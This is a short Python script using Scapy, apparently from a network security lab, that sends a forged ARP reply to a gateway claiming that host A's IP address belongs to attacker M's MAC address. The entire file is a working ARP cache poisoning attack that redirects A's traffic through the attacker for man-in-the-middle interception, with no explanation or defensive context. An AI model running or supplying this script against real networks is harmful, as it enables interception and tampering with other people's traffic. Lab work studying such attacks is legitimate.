#!/usr/bin/python3
from scapy.all import *

IP_victim = "192.168.60.1"  # gateway
MAC_victim = "02:42:b6:cf:51:60"  # gateway

IP_spoofed = "192.168.60.2"  # A
MAC_spoofed = "02:42:c0:a8:3c:03"  # M

print("SENDING SPOOFED ARP RESPONSE......")

ether = Ether()
ether.dst = MAC_victim
ether.src = MAC_spoofed

arp = ARP()
arp.psrc = IP_spoofed
arp.hwsrc = MAC_spoofed
arp.pdst = IP_victim
arp.op = 2
frame = ether/arp
sendp(frame)
